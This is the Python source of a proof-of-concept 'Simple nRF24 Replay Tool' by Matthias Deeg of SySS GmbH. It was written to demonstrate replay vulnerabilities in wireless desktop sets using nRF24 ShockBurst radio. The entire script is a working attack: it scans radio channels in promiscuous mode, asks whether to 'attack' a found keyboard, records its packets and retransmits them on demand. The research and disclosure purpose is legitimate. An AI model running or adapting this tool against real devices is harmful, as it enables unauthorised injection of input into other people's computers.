#!/usr/bin/env python2
# -*- coding: utf-8 -*-

"""
  Simple nRF24 Replay Tool

  by Matthias Deeg <matthias.deeg@syss.de>

  Proof-of-Concept software tool to demonstrate replay vulnerabilities of
  different wireless desktop sets using nRF24 ShockBurst radio communication

  Copyright (C) 2016 SySS GmbH

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

__version__ = '0.2'
__author__ = 'Matthias Deeg'

import argparse
from binascii import hexlify, unhexlify
from lib import nrf24
from time import sleep, time

SCAN_CHANNELS   = range(2, 84)              # channels to scan
DWELL_TIME      = 0.05                      # dwell time for each channel in seconds


def banner():
    """Show a fancy banner"""

    print("        _____  ______ ___  _  _     _____  _                      _  \n"
"       |  __ \\|  ____|__ \\| || |   |  __ \\| |                    | |     \n"
"  _ __ | |__) | |__     ) | || |_  | |__) | | __ _ _   _ ___  ___| |_       \n"
" | '_ \\|  _  /|  __|   / /|__   _| |  ___/| |/ _` | | | / __|/ _ \\ __|    \n"
" | | | | | \\ \\| |     / /_   | |   | |    | | (_| | |_| \\__ \\  __/ |_   \n"
" |_| |_|_|  \\_\\_|    |____|  |_|   |_|    |_|\\__,_|\\__, |___/\\___|\\__|\n"
"                                                    __/ |             \n"
"                                                   |___/              \n"
"Simple Replay Tool v{0} by Matthias Deeg - SySS GmbH (c) 2016".format(__version__))

# main program
if __name__ == '__main__':
    # show banner
    banner()

    # init argument parser
    parser = argparse.ArgumentParser()
    parser.add_argument('-a', '--address', type=str, help='Address of nRF24 device')
    parser.add_argument('-c', '--channels', type=int, nargs='+', help='ShockBurst RF channel', default=range(2, 84), metavar='N')

    # parse arguments
    args = parser.parse_args()

    # set scan channels
    SCAN_CHANNELS = args.channels

    if args.address:
        try:
            # address of nRF24 keyboard (CAUTION: Reversed byte order compared to sniffer tools!)
            address = args.address.replace(':', '').decode('hex')[::-1][:5]
            address_string = ':'.join('{:02X}'.format(ord(b)) for b in address[::-1])
        except:
            print("[-] Error: Invalid address")
            exit(1)
    else:
        address = ""

    try:
        # initialize radio
        print("[*] Configure nRF24 radio")
        radio = nrf24.nrf24()

        # enable LNA
        radio.enable_lna()
    except:
        print("[-] Error: Could not initialize nRF24 radio")
        exit(1)

    # put the radio in promiscuous mode with given address
    if len(address) > 0:
        radio.enter_promiscuous_mode(address[::-1])
    else:
        radio.enter_promiscuous_mode()

    # set the initial channel
    radio.set_channel(SCAN_CHANNELS[0])

    # sweep through the channels and decode ESB packets in pseudo-promiscuous mode
    print("[*] Scanning for wireless keyboard ...")
    last_tune = time()
    channel_index = 0
    payloads = []
    while True:
        # increment the channel
        if len(SCAN_CHANNELS) > 1 and time() - last_tune > DWELL_TIME:
            channel_index = (channel_index + 1) % (len(SCAN_CHANNELS))
            radio.set_channel(SCAN_CHANNELS[channel_index])
            last_tune = time()

        # receive payloads
        value = radio.receive_payload()
        if len(value) >= 10:
            # split the address and payload
            address, payload = value[0:5], value[5:]

            # show packet payload
            print("[+] Received data: {0}".format(hexlify(payload)))
            payloads.append(payload)

            # convert address to string and reverse byte order
            converted_address = address[::-1].tostring()
            address_string = ':'.join('{:02X}'.format(b) for b in address)
            print("[+] Found nRF24 device with address {0} on channel {1}".format(address_string, SCAN_CHANNELS[channel_index]))

            # ask user about device
            if not args.address:
                answer = raw_input("[?] Attack this device (y/n)? ")
                if answer[0] == 'y':
                    break
                else:
                    print("[*] Continue scanning ...")
            else:
                break

    # put the radio in sniffer mode (ESB w/o auto ACKs)
    radio.enter_sniffer_mode(converted_address)

    # if a specific address was given, also replay the read packets during scanning
    if args.address:
        packets = payloads
    else:
        packets = []

    recording = True

    # record ShockBurst data communication
    print("[*] Start recording (<CTRL+C> to stop recording)")
    while recording:
        try:
            # receive payload
            value = radio.receive_payload()

            if value[0] == 0:
                # split the payload from the status byte
                payload = value[1:]

                # add payload to list
                packets.append(payload)

                # show packet payload
                print("[+] Received data: {0}".format(hexlify(payload)))

        except KeyboardInterrupt:
            print("\n[*] Stop recording")
            recording = False

    # set packet list
    packet_list = packets

    # replay ShockBurst data communication
    replaying = True
    while replaying:
        try:
            key = raw_input("[*] Press <ENTER> to replay the recorded data packets or <CTRL+C> to quit ...")

            for p in packet_list:
                print("[+] Send data: {0}".format(hexlify(p)))
                radio.transmit_payload(p.tostring())

        except KeyboardInterrupt:
            print("\n[*] Stop replaying")
            replaying = False

    print("[*] Done.")

